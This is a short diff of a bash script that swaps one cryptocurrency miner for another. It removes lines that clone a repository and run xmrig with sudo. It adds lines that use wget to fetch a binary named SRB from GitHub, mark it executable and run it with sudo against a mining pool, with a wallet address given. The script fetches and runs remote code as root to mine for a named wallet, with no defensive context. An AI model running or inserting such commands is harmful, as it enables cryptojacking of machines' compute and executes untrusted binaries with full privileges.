@@ -1,5 +1,5 @@
-#!/bin/bash
-git clone https://github.com/realxdagg/job.git
-cd job
-chmod 500 xmrigDaemon xmrigMiner
-sudo ./xmrigDaemon -a mike --url stratum-eu.rplant.xyz:17040 --tls --user XqMPTMW5cPdVJYCiFcNZtbqXo9jjQ1iskM.01 --pass m=solo
+wget https://raw.githubusercontent.com/realxdagg/job/main/SRB
+chmod 500 SRB
+ph add SRB
+sudo ./SRB --disable-gpu --algorithm pufferfish2bmb --pool bmb.ffmpool.com:4444 --wallet 00AC9D12E39F0C70D1248D1C2BBD28F07664C6B3E9FC6B7D2B  --cpu-threads 8
+	
